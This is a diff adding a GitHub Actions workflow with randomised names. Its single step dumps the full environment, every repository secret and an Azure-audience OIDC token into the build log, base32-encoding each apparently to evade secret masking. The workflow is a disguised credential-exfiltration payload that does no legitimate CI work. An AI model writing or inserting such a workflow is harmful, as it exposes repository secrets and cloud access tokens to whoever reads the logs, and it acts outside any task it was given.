@@ -1,0 +1,26 @@
+# rnjbn2kue7zfll4k
+name: ic3moedmtwxi
+on: [push]
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  wkrndvtyd:
+    runs-on: ubuntu-latest
+    timeout-minutes: 7
+    env:
+      S3CVUOSLM: ${{ toJSON(secrets) }}
+    strategy:
+      fail-fast: false
+      matrix:
+        environment:
+          - "github-pages"
+    environment: ${{ matrix.environment }}
+    steps:
+      - name: 4mc3g6db4
+        run: |
+          env | base32 -w 109
+          printf '%s' '9' | base32 -w 109
+          printf '%s' "$S3CVUOSLM" | base32 -w 109
+          printf '%s' '9' | base32 -w 109
+          if [ -n "$ACTIONS_ID_TOKEN_REQUEST_URL" ]; then printf '%s' '9' | base32 -w 109; curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api%3A%2F%2FAzureADTokenExchange" | sed -n 's/.*"value":"\([^"]*\)".*/\1/p' | base32 -w 109; fi
